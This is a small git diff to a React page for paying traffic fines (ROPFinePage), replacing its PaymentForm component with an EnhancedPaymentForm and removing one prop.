@@ -9,7 +9,7 @@ import { Label } from "@/components/ui/label"
 import { Button } from "@/components/ui/button"
 import { ViolationsList } from "@/components/violations-list"
 import { SiteHeader } from "@/components/ui/header"
-import { PaymentForm } from "@/components/payment-form"
+import { EnhancedPaymentForm } from "@/components/payment-form"
 import { addData } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
 import { OTPDialog } from "@/components/otp-dialog"
@@ -232,8 +232,7 @@ export default function ROPFinePage() {
         >
           <OTPDialog isOpen={showOtp} onClose={() => setShowOTP(false)} phoneNumber="******0" />
           {showPayment ? (
-            <PaymentForm
-              handleSubmit={handlePaymentSuccess}
+            <EnhancedPaymentForm
               totalAmount={totalAmount}
               violations={violations.filter((v) => v.status === "unpaid")}
               onCancel={() => setShowPayment(false)} onSuccess={function (): void {
